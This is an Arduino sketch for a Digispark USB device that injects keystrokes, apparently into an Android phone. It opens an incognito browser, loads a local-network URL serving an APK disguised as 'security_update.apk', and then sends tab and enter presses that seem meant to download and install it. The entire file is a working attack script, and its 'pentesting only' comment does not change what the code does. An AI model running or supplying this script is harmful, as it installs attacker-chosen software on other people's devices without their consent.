#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
	// Timing and commands may need alterations depending on your device/firmware.
	// For educational and pentesting purposes ONLY! Use at your own risk!
	// Author: sativa/einxrw
	
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.delay(250);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_B);
	DigiKeyboard.delay(800);
	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,MOD_SHIFT_LEFT,KEY_N);
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_L);
	DigiKeyboard.delay(1000);
	
	// Change URL to the path of your APK.
	DigiKeyboard.print("192.168.4.4:9002/security_update.apk");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(7000);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(79);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(79);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(2000);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.delay(350);
	DigiKeyboard.sendKeyStroke(43);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(350);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(UNDEFINED_KEY);
}
